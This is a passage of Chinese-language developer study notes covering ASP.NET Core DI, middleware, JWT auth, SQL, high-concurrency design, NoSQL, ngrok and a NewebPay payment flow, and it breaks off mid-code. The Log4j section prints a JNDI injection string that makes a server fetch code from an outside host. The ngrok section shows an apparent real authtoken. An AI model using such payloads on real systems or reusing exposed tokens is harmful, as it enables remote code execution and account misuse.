- **Scoped**: 每個 **Request** 都重新 `new` 一個新的實例，同一個 **Request** 不管經過多少個 Pipeline 都是用同一個實例。上例所使用的就是 **Scoped**。
- **Singleton**: 被實例化後就不會消失，程式運行期間只會有一個實例。

![[鐵人賽 Day04] ASP.NET Core 2 系列 - 依賴注入(Dependency Injection) - 實例產生動畫](https://blog.johnwu.cc/images/pasted-209.gif)

### View

- View 注入 Service 的方式，直接在 `*.cshtml` 使用 `@inject`：

  ```C#
  @using MyWebsite
  
  @inject ISampleTransient transient
  @inject ISampleScoped scoped
  @inject ISampleSingleton singleton
  
  <table border="1">
      <tr><td colspan="3">Cotroller</td></tr>
      <tr><td>Lifetimes</td><td>Id</td><td>Hash Code</td></tr>
      <tr><td>Transient</td><td>@ViewBag.TransientId</td><td>@ViewBag.TransientHashCode</td></tr>
      <tr><td>Scoped</td><td>@ViewBag.ScopedId</td><td>@ViewBag.ScopedHashCode</td></tr>
      <tr><td>Singleton</td><td>@ViewBag.SingletonId</td><td>@ViewBag.SingletonHashCode</td></tr>
  </table>
  <hr />
  <table border="1">
      <tr><td colspan="3">View</td></tr>
      <tr><td>Lifetimes</td><td>Id</td><td>Hash Code</td></tr>
      <tr><td>Transient</td><td>@transient.Id</td><td>@transient.GetHashCode()</td></tr>
      <tr><td>Scoped</td><td>@scoped.Id</td><td>@scoped.GetHashCode()</td></tr>
      <tr><td>Singleton</td><td>@singleton.Id</td><td>@singleton.GetHashCode()</td></tr>
  </table>
  ```

### Service

```C#
public class CustomService
{
    public ISample Transient { get; private set; }
    public ISample Scoped { get; private set; }
    public ISample Singleton { get; private set; }

    public CustomService(ISampleTransient transient,
        ISampleScoped scoped,
        ISampleSingleton singleton)
    {
        Transient = transient;
        Scoped = scoped;
        Singleton = singleton;
    }
}
```



## Middleware

- SP.NET Core 在 Middleware 的官方說明中，使用了 Pipeline 這個名詞，意旨 Middleware 像水管一樣可以串聯在一起，所有的 Request 及 Response 都會層層經過這些水管。

  ![[鐵人賽 Day03] ASP.NET Core 2 系列 - Middleware - 概念](https://blog.johnwu.cc/images/i03-1.png)

  ![[鐵人賽 Day03] ASP.NET Core 2 系列 - Middleware](https://blog.johnwu.cc/images/pasted-114.gif)

### App.Use

- Middleware 的註冊方式是在 *Startup.cs* 的 `Configure` 對 `IApplicationBuilder` 使用 `Use` 方法註冊。
  大部分擴充的 Middleware 也都是以 **Use** 開頭的方法註冊，例如：
  - **UseMvc()** ：MVC 的 Middleware
  - **UseRewriter()** ：URL rewriting 的 Middleware

```C#
public class Startup
{
    // ...
    public void Configure(IApplicationBuilder app)
    {
        app.Use(async (context, next) => 
        {
            await context.Response.WriteAsync("First Middleware in. \r\n");
            await next.Invoke();
            await context.Response.WriteAsync("First Middleware out. \r\n");
        });

        app.Use(async (context, next) => 
        {
            await context.Response.WriteAsync("Second Middleware in. \r\n");
            await next.Invoke();
            await context.Response.WriteAsync("Second Middleware out. \r\n");
        });

        app.Use(async (context, next) => 
        {
            await context.Response.WriteAsync("Third Middleware in. \r\n");
            // 水管阻塞，封包不往後送
            //await next.Invoke();
            await context.Response.WriteAsync("Third Middleware out. \r\n");
        });

        app.Run(async (context) =>
        {
            await context.Response.WriteAsync("Hello World! \r\n");
        });
    }
}

/*
First Middleware in. 
Second Middleware in. 
Second Middleware out. 
First Middleware out. 
*/
```

### App.Run

- `Run` 是 Middleware 的最後一個行為，以上面圖例來說，就是最末端的 Action。它不像 `Use` 能串聯其他 Middleware，但 `Run` 還是能完整的使用 Request 及 Response。

### App.Map

- `Map` 是能用來處理一些簡單路由的 Middleware，可依照不同的 URL 指向不同的 `Run` 及註冊不同的 `Use`。

```C#
public class Startup
{
    // ...
    public void Configure(IApplicationBuilder app)
    {
        app.Use(async (context, next) => 
        {
            await context.Response.WriteAsync("First Middleware in. \r\n");
            await next.Invoke();
            await context.Response.WriteAsync("First Middleware out. \r\n");
        });

        //進到 http://localhost:5000/second 才會執行
        app.Map("/second", mapApp =>
        {
            mapApp.Use(async (context, next) => 
            {
                await context.Response.WriteAsync("Second Middleware in. \r\n");
                await next.Invoke();
                await context.Response.WriteAsync("Second Middleware out. \r\n");
            });
            mapApp.Run(async context =>
            {
                await context.Response.WriteAsync("Second. \r\n");
            });
        });

        app.Run(async context =>
        {
            await context.Response.WriteAsync("Hello World! \r\n");
        });
    }
}

/*
https://localhost:5001/
    First Middleware in. 
    Hello World! 
    First Middleware out. 

https://localhost:5001/second
    First Middleware in. 
    Second Middleware in. 
    Second. 
    Second Middleware out. 
    First Middleware out. 
*/
```



### Extract Middleware

- 新增類別檔，將各Middleware獨立出來

```C#
//FirstMiddleware.cs
public class FirstMiddleware
{
    private readonly RequestDelegate _next;

    public FirstMiddleware(RequestDelegate next)
    {
        _next = next;
    }

    public async Task Invoke(HttpContext context)
    {
        await context.Response.WriteAsync($"{nameof(FirstMiddleware)} in. \r\n");

        await _next(context);

        await context.Response.WriteAsync($"{nameof(FirstMiddleware)} out. \r\n");
    }
}
```

#### 全域註冊

- 在 `Startup.Configure` 註冊 Middleware 就可以套用到所有的 Request。如下：

```C#
public class Startup
{
    // ...
    public void Configure(IApplicationBuilder app)
    {
        app.UseMiddleware<FirstMiddleware>();
        // ...
    }
}
```

#### 區域註冊

- Middleware 也可以只套用在特定的 Controller 或 Action。註冊方式如下：

```C#
[MiddlewareFilter(typeof(FirstMiddleware))]
public class HomeController : Controller
{
    // ...

    [MiddlewareFilter(typeof(SecondMiddleware))]
    public IActionResult Index()
    {
        // ...
    }
}
```

#### Extensions

- 建立IApplicationBuilder Extension Method

  ```C#
  // Extensions\CustomMiddlewareExtensions.cs
  public static class CustomMiddlewareExtensions
  {
      public static IApplicationBuilder UseFirstMiddleware(this IApplicationBuilder builder)
      {
          return builder.UseMiddleware<FirstMiddleware>();
      }
  }
  ```

  ```C#
  public class Startup
  {
      // ...
      public void Configure(IApplicationBuilder app)
      {
          app.UseFirstMiddleware();
          // ...
      }
  }
  ```

  



## appsettings.json

1. 若執行環境為 *Production* ，只讀 *appsettings.json* 。

2. 若執行環境為 *Development* ，先讀取 *appsettings.json* 再讀取 *appsettings.Development.json* 。並合併兩檔的組態。若組態項目重複，則以後來者覆蓋先前設定，亦即以 *appsettings.Development.json* 為準。

3. #### 如何決定執行環境

   - *launchSettings.json* 內 **ASPNETCORE_ENVIRONMENT**值
   - 如果沒有指定 ASPNETCORE_ENVIRONMENT 環境變數，則預設的執行環境是 *Production* 



## Attribute

- ###### Attribute 提供一個有用的方法，使中繼資料 (或宣告式資訊) 與程式碼 (組件、型別、方法和屬性 (Property) 等) 產生關聯。 當屬性 (Attribute) 與程式實體 (Entity) 產生關聯之後，即可在執行階段使用稱為「反映」(Reflection) 的技術來加以查詢。

- ###### 透過Attribute定義Enum或類別描述，可透過Reflection取得

  - ###### 定義一個客製化Attribute，並設定`Description`屬性

    - ```C#
      public class ReportDescriptionAttribute : Attribute
      {
          public string Description { get; set; }
      
          public ReportDescriptionAttribute(string Description)
          {
              this.Description = Description;
          }
      
          public override string ToString()
          {
              return this.Description.ToString();
          }
      }
      ```

  - ###### 針對類別內的各屬性加入`Attribute`描述

    - ```C#
      public class SNCode
      {
          /// <summary>
          /// 里程碑主檔
          /// </summary>
          [ReportDescription("里程碑主檔")]
          public const string Milestone = "Milestone_SN";
      
          /// <summary>
          /// 里程碑產出檔案
          /// </summary>
          [ReportDescription("里程碑產出檔案")]
          public const string MilestoneProd = "Milestone_Prod_SN";
      
          /// <summary>
          /// 專案風險檔
          /// </summary>
          [ReportDescription("專案風險檔")]
          public const string ProjectRisk = "Project_Risk_SN";
      
          /// <summary>
          /// 專案風險檔
          /// </summary>
          [ReportDescription("專案風險檔")]
          public const string ProjectMeasure = "Project_Measure_SN";
      }
      ```

  - ###### 透過Reflection取得內容

    - ```c#
      var members = typeof(SNCode).GetMember("MilestoneProd");
      var attributes = members[0].GetCustomAttributes(typeof(ReportDescriptionAttribute), false);
      var description = ((ReportDescriptionAttribute)attributes[0]).Description;
      ```


## Json Web Token

- ##### JWT是一種『有限時間內可利用認證令牌要求對應的操作權限』的一種方法

- ##### 使用者登入後產生Token，後續針對Request內夾帶的Token進行驗證。

  - ##### 客戶端從伺服器端取得認證簽名後，伺服器端只對認證簽名進行驗證，從認證簽名來判斷是不是具備指定的操作資格．除此之外還會判斷令牌是否過期、是否是黑名單等狀況。

- ##### 主要驗證內容為產生Token時的資訊內容。Ex.

  - ###### 相同的 **Issuer **設定值

  - ###### 相同的 **Audience **設定值

  - ###### 驗證 **Token **有效期限

    - ###### 符合對稱式加密的簽章

  - ###### Token內可包含自定義資訊，但驗證時不會針對使用者進行驗證，因為驗證時不會再連接DB。

  - ###### 因此，只要產生Token的設定一致，不同Service也可以透過相同Token驗證

- ##### 包含了 **header**、**payload**和**signature** 三個部分

  - **Header** 

    - ##### 包含了兩個主要資訊：使用的加密演算法和token的類型(基本上就是JWT)

    - ##### 這些內容通過 [Base64](https://zh.wikipedia.org/wiki/Base64) 轉化就能夠得到我們的第一段字串。

      - ```
        eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
        ```

    ```C#
    // 使用HS256演算法來產生JWT token
    {
      "alg": "HS256",
      "typ": "JWT"
    }
    ```

  - **Payload**

    - ##### 包含了聲明的資料，帶有欲存放的資訊（例如用戶資訊）

    - ##### Payload 又可以被稱為 claims

    - ##### 定義上有 3 種聲明 (Claims)

      - ###### Reserved (註冊聲明)

      - ###### Public (公開聲明)

      - ###### Private (私有聲明)

    - ##### Reserved (註冊聲明)

      - ###### iss (Issuer) - JWT的發行人

      - ###### sub (Subject) - JWT的主題（用戶）

      - ###### aud（audience）：JWT的目標收件人

      - ###### exp（expiration time）：JWT到期的時間

      - ###### nbf（not before time）：不得接受JWT處理的時間

      - ###### iat（issued at time）：發布JWT的時間; 可用於確定JWT的年齡

      - ###### jti（JWT ID）：唯一標識符; 可用於防止JWT被重放（允許令牌僅使用一次）

    - base64 加密（該加密是可以對稱解密的)

    ```C#
    /*
        sub就是RFC7519中定義的基本資訊，
        age則是我們自己加上去的
    */
    
    {
      "sub": "wellwind",
      "age": 30
    }
    ```

  - **Signature**

    - ###### 將被轉換成 Base64 編碼的 Header、Payload 與自己定義的密鑰，透過在 Header 設定的雜湊演算法方式所產生的

    - ###### 用來確保資料完整性的一個雜湊簽章

    - ###### 可以選用任何雜湊演算法來進行處理

- 驗證流程

  ![img](https://dotblogsfile.blob.core.windows.net/user/wellwind/c93407af-3191-48e8-9029-2e02a7e03b1e/1479955047_94613.png)

- 流程

  1. 使用者登入進行身分驗證後產生Token

     ```C#
     [Route("api/[controller]")]
     [ApiController]
     public class AuthController : ControllerBase
     {
         private readonly IConfiguration _config;
     
         public AuthController(IConfiguration configuration)
         {
             _config = configuration;
         }
     
         // GET api/auth/login
         [HttpGet, Route("login")]
         public IActionResult Login(string name)
         {
             // STEP0: 在產生 JWT Token 之前，可以依需求做身分驗證
     
             // STEP1: 建立使用者的 Claims 聲明，這會是 JWT Payload 的一部分
             var userClaims = new ClaimsIdentity(new[] {
                 new Claim(JwtRegisteredClaimNames.NameId, name),
                 new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString()),
                 new Claim("CustomClaim", "Anything You Like")
             });
             // STEP2: 取得對稱式加密 JWT Signature 的金鑰
             // 這部分是選用，但此範例在 Startup.cs 中有設定 ValidateIssuerSigningKey = true 所以這裡必填
             var securityKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_config["Jwt:Key"]));
             // STEP3: 建立 JWT TokenHandler 以及用於描述 JWT 的 TokenDescriptor
             var tokenHandler = new JwtSecurityTokenHandler();
             var tokenDescriptor = new SecurityTokenDescriptor
             {
                 Issuer = _config["Jwt:Issuer"],
                 Audience = _config["Jwt:Issuer"],
                 Subject = userClaims,
                 Expires = DateTime.Now.AddMinutes(30),
                 SigningCredentials = new SigningCredentials(securityKey, SecurityAlgorithms.HmacSha256)
             };
             // 產出所需要的 JWT Token 物件
             var securityToken = tokenHandler.CreateToken(tokenDescriptor);
             // 產出序列化的 JWT Token 字串
             var serializeToken = tokenHandler.WriteToken(securityToken);
     
             return new ContentResult() { Content = serializeToken };
         }
     }
     ```

  2. 專案內加入驗證

     ```C#
     public void ConfigureServices(IServiceCollection services)
     {
         services.AddMvc().SetCompatibilityVersion(CompatibilityVersion.Version_2_2);
     
         // STEP1: 設定用哪種方式驗證 HTTP Request 是否合法
         services
         // 檢查 HTTP Header 的 Authorization 是否有 JWT Bearer Token
         .AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
         // 設定 JWT Bearer Token 的檢查選項
         .AddJwtBearer(options =>
          {
            options.TokenValidationParameters = new TokenValidationParameters
            {
                ValidateIssuer = true,
                ValidIssuer = Configuration["Jwt:Issuer"],
                ValidateAudience = true,
                ValidAudience = Configuration["Jwt:Issuer"],
                ValidateLifetime = true,
                ValidateIssuerSigningKey = true,
                IssuerSigningKey = new SymmetricSecurityKey
                    (Encoding.UTF8.GetBytes(Configuration["Jwt:Key"]))
            };
          });
     }
     ```

  3. 驗證API

     ```C#
     [Route("api/[controller]")]
     [ApiController]
     public class ValuesController : ControllerBase
     {
         // GET api/values/anonymous
         /// <summary>使用匿名登入，無視於身分驗證</summary>
         [AllowAnonymous]
         [HttpGet, Route("anonymous")]
         public IActionResult Anonymous()
         {
             return new ContentResult() { Content = $@"For all anonymous." };
         }
     
         // GET api/values/authorize
         /// <summary>使用身分驗證，HTTP 的 Authorization Header 必須設定合法的 JWT Bearer Token 才能使用</summary>
         [Authorize]
         [HttpGet, Route("authorize")]
         public IActionResult All()
         {
             return new ContentResult() { Content = $@"For all client who authorize." };
         }
     }
     ```

### JwtRegisteredClaimNames 屬性

- 在建立使用者的 Claims 聲明時，我們會用到很多 `JwtRegisteredClaimNames` 結構型別，來取得是先定義好的字串

- |   Claim    | 說明                                                 | 連結                                         |
  | :--------: | :--------------------------------------------------- | -------------------------------------------- |
  |    Jti     | 表示 JWT ID，Token 的唯一識別碼                      | http://tools.ietf.org/html/rfc7519#section-4 |
  |    Iss     | 表示 Issuer，發送 Token 的發行者                     | http://tools.ietf.org/html/rfc7519#section-4 |
  |    Iat     | 表示 Issued At，Token 的建立時間                     | http://tools.ietf.org/html/rfc7519#section-4 |
  |    Exp     | 表示 Expiration Time，Token 的逾期時間               | http://tools.ietf.org/html/rfc7519#section-4 |
  |    Sub     | 表示 Subject，Token 的主體內容                       | http://tools.ietf.org/html/rfc7519#section-4 |
  |    Aud     | 表示 Audience，接收 Token 的觀眾                     | http://tools.ietf.org/html/rfc7519#section-4 |
  |    Typ     | 表示 Token 的類型，例如 JWT 表示 JSON Web Token 類型 | http://tools.ietf.org/html/rfc7519#section-4 |
  |    Nbf     | 表示 Not Before，定義在什麼時間之前，不可用          | http://tools.ietf.org/html/rfc7519#section-4 |
  |   Actort   | 識別執行授權的代理是誰                               | http://tools.ietf.org/html/rfc7519#section-4 |
  |   NameId   | 使用者識別碼                                         | http://tools.ietf.org/html/rfc7519#section-4 |
  | FamilyName | 使用者姓氏                                           | http://tools.ietf.org/html/rfc7519#section-4 |
  | GivenName  | 使用者名字                                           | http://tools.ietf.org/html/rfc7519#section-4 |
  |   Gender   | 使用者性別                                           | http://tools.ietf.org/html/rfc7519#section-4 |
  |   Email    | 使用者的電子郵件                                     | http://tools.ietf.org/html/rfc7519#section-4 |
  | Birthdate  | 使用者生日                                           | http://tools.ietf.org/html/rfc7519#section-4 |
  |  Website   | 使用者的網站                                         | http://tools.ietf.org/html/rfc7519#section-4 |


### Bearer Token 

- HTTP 的認證「Authorization」方案有許多種格式，而 Bearer 就是其中一種且被定義在 Header 中的驗證方案，通常搭配於 JWT 上

- Resource server 是資源服務器，即後端存放用戶生成的 API Token 的服務器。 
- Authorization server 的意思是認證服務器，即後端專門用來處理認證的服務器
- 這些東西都是由 [OAuth 2.0](http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html) 中所定義出來的，在定義中說明了 Client 如何取得 Access Token 的方法



# Others

## SQL 

### 索引

- #### 叢集索引

  - ######  當資料表設定了「叢集索引」，則資料表「實體資料列」的順序會依據叢集索引的值做排序

  - ######  每一資料表只能有一個「叢集索引」

  - ###### SQL Server  資料表的**主索鍵**（PK），預設為「叢集索引」且是唯一的（Unique）

  - ###### B-Tree結構

  - ###### 叢集索引插入資料時速度較慢（時間花費在「物理存儲的排序」上，要找到對的位置進行插入）

  - ###### 查詢資料速度: 叢集索引 > 非叢集索引

- #### 非叢集索引

  - ###### 資料列未根據非叢集索引進行排序與儲存

  - ######  每一資料表能有249個「非叢集索引」

  - ###### 組合欄位索引有16欄位與總和900位元組索引鍵大小的限制 ，可以使用內含資料行(INCLUDE)來規避這個限制並加速查詢作業。

  - ###### B-Tree結構

  - ###### 非叢集索引建立的先後順序並不是很重要，因為它們不會互相影響也不會對改變資料表中實際資料的排序，但是建立叢集索引會影響實際資料排列，也會影響已建立的非叢集索引。

### 跳過N筆資料

- ##### OFFSET N rows 跳過n筆資料列，需搭配order by 告訴server怎麼排序資料

- ##### 搭配 FETCH NEXT 指定取的筆數

  - ```sql
      SELECT *
      FROM [ABP].[dbo].[AbpUsers]
      order by id  /**** 一定要搭配order by 才知道排序 ***/
      OFFSET 1 ROWS  /****跳過第一筆資料 ***/
      FETCH NEXT 1 ROWS ONLY;/****取一筆，若沒使用Fetch Next 則取全部 ***/
    ```

### Master Slave Replication

- ##### **主從式架構**：將資料庫的 server 區分成 Master(1台) 與 Slave(N台) 兩種，Master 負責資料寫入，Slave 提供資料檢索；這樣就把壓力分散到幾台 Server 上面。

- ##### **資料庫同步**：Slave 會同步 Master 的資料，這樣除了分散 server 壓力外，資料也獲得了備份。

- ##### 同步方式

  - ###### 在 master 的 server 執行的 SQL command 會被記錄在 Binary Log 裡面

  - ###### master 將 Binary Log 傳送到 slave 的 Relay Log

  - ###### slave 依據 Relay Log 做資料的變更

  - ![img](https://miro.medium.com/max/1400/1*WlxDWYwxwlj3-k_yVumyOg.png)

### 參考

- [MySQL Master Slave Replication 主從式架構設定教學](https://medium.com/dean-lin/16d0a0fa1d04)



##  Log4j 資安漏洞

- ###### 這次出問題的套件就是 Log4j，而出問題的原因跟我開頭講的一樣，有一個鮮為人知的功能有著安全性的漏洞，只要 Log4j 在記錄 log 時記錄到某個特定格式的東西，就會去執行相對應的程式碼。

- `${jndi:ldap://cymetrics.io/test}`

  - ###### 當 Log4j 紀錄上面那一串字的時候，它發現這串字符合特定格式，就會去裡面的網址（cymetrics.io/test）下載程式碼然後執行，因此這是一個 RCE（Remote Code Execution，遠端程式碼執行）漏洞。

## 高併發處理

- ##### 高併發意味著大流量，需要運用技術手段抵抗流量的衝擊，這些手段好比操作流量，能讓流量更平穩地被系統所處理，帶給使用者更好的體驗。

- ##### 名詞解釋

  - ###### **QPS：** 每秒請求或查詢的數量，在網際網路領域，指每秒響應請求數；

  - ###### **吞吐量：** 單位時間內處理的請求量（通常由QPS與併發數決定）；

  - ###### 併發數 = QPS*平均響應時間

    - ###### 假設我們當前一個http請求伺服器處理完成需要100ms（即那麼 **平均響應時間 = 100ms** ）。那麼它1s鍾可以處理10個請求。也就是說 **qps = 10**。推算出 **併發數 = 10**

  - ###### **響應時間：** 從請求發出到收到響應花費的時間，例如一個系統處理一個HTTP請求需要100ms，這個100ms就是系統的響應時間；

  - ###### **PV：** 綜合瀏覽量，即頁面瀏覽量或者點選量，一個訪客在24小時內訪問的頁面數量；

  - ###### **UV：** 獨立訪客 ，即一定時間範圍內相同訪客多次訪問網站，只計算為一個獨立的訪客；

  - ###### **頻寬：** 計算頻寬大小需要關注兩個指標，**峰值流量和頁面的平均大小** ；

  - ###### **壓力測試：** 測試能承受的最大併發，測試最大承受的QPS值。

### 巨集觀目標

- ##### 高效能：

  - ###### 效能體現了系統的並行處理能力，在有限的硬體投入下，提高效能意味著節省成本。同時，效能也反映了使用者體驗，響應時間分別是100毫秒和1秒，給使用者的感受是完全不同的。

  - **效能指標**

    - ##### 平均響應時間:

      - ###### 最常用，但是缺陷很明顯，對於慢請求不敏感。比如1萬次請求，其中9900次是1ms，100次是100ms，則平均響應時間為1.99ms，雖然平均耗時僅增加了0.99ms，但是1%請求的響應時間已經增加了100倍。

    - ##### TP90、TP99等分位值

      - ###### 將響應時間按照從小到大排序，TP90表示排在第90分位的響應時間， 分位值越大，對慢請求越敏感

    - ##### 吞吐量

      - ###### 和響應時間呈反比，比如響應時間是1ms，則吞吐量為每秒1000次。

    - ##### 通常，設定效能目標時會兼顧吞吐量和響應時間，比如這樣表述：在每秒1萬次請求下，AVG控制在50ms以下，TP99控制在100ms以下。對於高併發系統，AVG和TP分位值必須同時要考慮。

    - ##### 從使用者體驗角度來看，200毫秒被認為是第一個分界點，使用者感覺不到延遲，1秒是第二個分界點，使用者能感受到延遲，但是可以接受。

    - ##### 因此，對於一個健康的高併發系統，TP99應該控制在200毫秒以內，TP999或者TP9999應該控制在1秒以內。

- ##### 高可用：

  - ###### 表示系統可以正常服務的時間。一個全年不停機、無故障；另一個隔三差五出線上事故、宕機，使用者肯定選擇前者。另外，如果系統只能做到90%可用，也會大大拖累業務。

  - ###### 為了保證可用性，通常會對服務介面進行超時設定，以防大量執行緒阻塞在慢請求上造成系統雪崩，那超時時間設定成多少合理呢？一般，我們會參考依賴服務的效能表現進行設定。

  - **可用性指標**

    - ###### 可用性是指系統具有較高的無故障執行能力，可用性 = 正常執行時間 / 系統總執行時間，一般使用幾個9來描述系統的可用性。

    - ###### 對於高併發系統來說，最基本的要求是：保證3個9或者4個9。原因很簡單，如果你只能做到2個9，意味著有1%的故障時間，像一些大公司每年動輒千億以上的GMV或者收入，1%就是10億級別的業務影響。

    - ![img](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/816edc4cd87445b18ff63419612d0ca9~tplv-k3u1fbpfcp-zoom-1.image)

- ##### 高擴充套件：

  - ###### 表示系統的擴充套件能力，流量高峰時能否在短時間內完成擴容，更平穩地承接峰值流量

  - ###### 將服務設計成無狀態的，這種叢集設計保證了高擴充套件性，其實也間接提升了系統的效能和可用性。

  -  **可擴充套件性指標**

    - ###### 對於業務叢集或者基礎元件來說，擴充套件性 = 效能提升比例 / 機器增加比例，理想的擴充套件能力是：資源增加幾倍，效能提升幾倍。通常來說，擴充套件能力要維持在70%以上。

    - ###### 但是從高併發系統的整體架構角度來看，擴充套件的目標不僅僅是把服務設計成無狀態就行了，因為當流量增加10倍，業務服務可以快速擴容10倍，但是資料庫可能就成為了新的瓶頸。

    - ###### 因此，高擴充套件性需要考慮：服務叢集、資料庫、快取和訊息佇列等中介軟體、負載均衡、頻寬、依賴的第三方等，當併發達到某一個量級後，上述每個因素都可能成為擴充套件的瓶頸點。

### 實踐方案

-  **縱向擴充套件（scale-up）**

  - ##### 目標是提升單機的處理能力，方案包括

    - ###### 提升單機的硬體效能：通過增加記憶體、 CPU核數、儲存容量、或者將磁碟 升級成SSD 等堆硬 件 的 方 式 來 提升 。

    - ###### 提升單機的軟體效能：使用快取減少IO次數，使用併發或者非同步的方式增加吞吐量。

- **橫向擴充套件（scale-out）**

  - ###### 引入橫向擴充套件，通過叢集部署以進一步提高併發處理能力

    - ###### 做好分層架構：

      - ###### 這是橫向擴充套件的提前，因為高併發系統往往業務複雜，通過分層處理可以簡化複雜問題，更容易做到橫向擴充套件。

      - ![img](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5fdaefaa2f434f92bcbda2173bc1246d~tplv-k3u1fbpfcp-zoom-1.image)

    - ###### 各層進行水平擴充套件:

      - ###### 無狀態水平擴容，有狀態做分片路由。業務叢集通常能設計成無狀態的，而資料庫和快取往往是有狀態的，因此需要設計分割槽鍵做好儲存分片，當然也可以通過主從同步、讀寫分離的方案提升讀效能。

- ##### 具體實踐方案

  - ###### 叢集部署，通過負載均衡減輕單機壓力。

  - ###### 多級快取，包括靜態資料使用CDN、本地快取、分散式快取等，以及對快取場景中的熱點key、快取穿透、快取併發、資料一致性等問題的處理。

  - ###### 分庫分表和索引優化，以及藉助搜尋引擎解決複雜查詢問題。

  - ###### NoSQL資料庫的使用，比如HBase、TiDB等，但是團隊必須熟悉這些元件，且有較強的運維能力。

  - ###### 非同步化，將次要流程通過多執行緒、MQ、甚至延時任務進行非同步處理。

  - ###### 限流，需要先考慮業務是否允許限流（比如秒殺場景是允許的），包括前端限流、Nginx接入層的限流、服務端的限流。

  - ###### 對流量進行 削峰填谷 ，通過 MQ承接流量。

  - ###### 併發處理，通過多執行緒將序列邏輯並行化。

  - ###### 預計算，比如搶紅包場景，可以提前計算好紅包金額快取起來，發紅包時直接使用即可。

  - ###### 快取預熱 ，通過非同步 任務 提前 預熱資料到本地快取或者分散式快取中。

  - ###### 減少IO次數，比如資料庫和快取的批量讀寫、RPC的批量介面支援、或者通過冗餘資料的方式幹掉RPC呼叫。

  - ###### 減少IO時的資料包大小，包括採用輕量級的通訊協議、合適的資料結構、去掉介面中的多餘欄位、減少快取key的大小、壓縮快取value等。

  - ###### 程式邏輯優化，比如將大概率阻斷執行流程的判斷邏輯前置、For迴圈的計算邏輯優化，或者採用更高效的演算法。

  - ###### 各種池化技術的使用和池大小的設定，包括HTTP請求池、執行緒池（考慮CPU密集型還是IO密集型設定核心引數）、資料庫和Redis連線池等。

  - 



## NoSQL 

- ##### 非關聯式資料庫，將資料儲存為類似 JSON 的文件，並對資料進行查詢，這是一個 document 資料庫模型

- ##### doucment 是 key-value 的有序集合。資料庫中的每個doucment 不需要具有相同的數據結構，你可以將資料儲存在 JSON、XML文件甚至CSV文件 

- ##### 優點：

  - ###### 海量數據下，讀寫性能優異

  - ###### 沒有固定欄位，依需求增加或減少。 

  - ###### 數據間無關係，易於擴展

- ##### 缺點

  - ###### 無架構指導

  - ###### 無歷史資料模型

- ##### 使用時機

  - ##### SQL

    - ###### 重要的資料

    - ###### 資料與資料之間有關聯性

    - ###### 需要複雜的查詢

  - ##### NoSQL

    - ###### 資料量大

      - ###### 由於 NOSQL 相較於 RDBMS 更容易做 horizontal scaling，且本身的設計就是分散式系統的設計。因此對於未來有大量擴充需求的系統，會更容易的去擴充，且擴充的成本也較低。

    - ###### 單純的資料、無關聯

    - ###### 即時性

    - ###### 需搜集未知的資料

    - ###### 經常擴充

### NOSQL 比 RDBMS 快嗎?

- ##### RDBMS 以及 NOSQL 在查詢上最主要的差別在於，RDBMS 可以執行較複雜的查詢，因為 RDBMS 具有關聯的特性

  - ##### 例如有顧客、商品、銷售員三個資料表，分別儲存顧客的個人資料、商品的詳細價格與類別以及銷售員的個人資料，RDBMS 此時可以將三個表依照指定邏輯將他們關聯起來，建立一個含有某個顧客，從某個銷售員手上，購買的某個商品，這樣子的一個資料表。

  - ##### 因此 RDBMS 在查詢上，可能需要跟很多資料表做關聯，等於是多查詢了很多個資料表，因此查詢的時間相對比較長。

- ##### 對比的 NOSQL，因為不包含任何關聯，單筆資料查詢後的所有需要的資料，都存在這一筆資料中，不需要做其他額外的查詢，相較之下會比 RDBMS 快。



### ngrok

- ###### 設定臨時性外部Domain

- [Ngrok](https://dashboard.ngrok.com/get-started/setup)

- ```powershell
  ngrok authtoken 2DIhpCpGcqlOblFVpsKxGOKU0gR_2ufySzxBRRtnwAvSqtHtW 登入授權
  ngrok http 5000 //指定本基端Port號對外
  ngrok http 5000 --host-header="localhost:5000"
  //設定完成後回傳一組暫時性網址對應指定PORT
  https://1d18-1-162-108-143.jp.ngrok.io -> http://localhost:3000 
  ```



# 金流

## 藍新金流

### 支付流程

1. ##### 測試環境申請一組帳號。資料可以為虛假(測試用)

2. ##### 建立店家，並取得相關資訊(商店代號、API串接金鑰)

3. ##### 前端呼叫訂單API，API將所需資訊組合成Form表單回傳給前端

   - ```C#
     //接收前端傳過來的訂單資料，並組出藍新所需表單內容
     public IActionResult SendToNewebPay(SendToNewebPayIn inModel)
     {
         SendToNewebPayOut outModel = new SendToNewebPayOut();
     
         //建立藍新所需資料Model
         List<KeyValuePair<string, string>> TradeInfo = new List<KeyValuePair<string, string>>();
         // 商店代號，步驟2取得
         TradeInfo.Add(new KeyValuePair<string, string>("MerchantID", inModel.MerchantID));
         // 回傳格式
         TradeInfo.Add(new KeyValuePair<string, string>("RespondType", "String"));
         // TimeStamp
         TradeInfo.Add(new KeyValuePair<string, string>("TimeStamp", DateTimeOffset.Now.ToOffset(new TimeSpan(8, 0, 0)).ToUnixTimeSeconds().ToString()));
         // 串接程式版本
         TradeInfo.Add(new KeyValuePair<string, string>("Version", "2.0"));
         // 商店訂單編號
         TradeInfo.Add(new KeyValuePair<string, string>("MerchantOrderNo", inModel.MerchantOrderNo));
         // 訂單金額
         TradeInfo.Add(new KeyValuePair<string, string>("Amt", inModel.Amt));
         // 商品資訊
         TradeInfo.Add(new KeyValuePair<string, string>("ItemDesc", inModel.ItemDesc));
         // 繳費有效期限(適用於非即時交易)
         TradeInfo.Add(new KeyValuePair<string, string>("ExpireDate", inModel.ExpireDate));
         
         // 藍新支付頁面失敗或完成後，系統導回的路徑位置(這邊會回傳到CallbackReturn API)
         TradeInfo.Add(new KeyValuePair<string, string>("ReturnURL", "https://1d18-1-162-108-143.jp.ngrok.io/Home/CallbackReturn"));
         // 當使用者支付成功後，藍新系統會透過幕後方式回傳給商店相關支付結果資料
         TradeInfo.Add(new KeyValuePair<string, string>("NotifyURL", "https://1d18-1-162-108-143.jp.ngrok.io/Home/CallbackNotify"));
         // 系統取號後以 form post 方式將結果導回商店指定的網址
         TradeInfo.Add(new KeyValuePair<string, string>("CustomerURL", "https://1d18-1-162-108-143.jp.ngrok.io/Home/CallbackCustomer"));
         // 支付取消返回商店網址
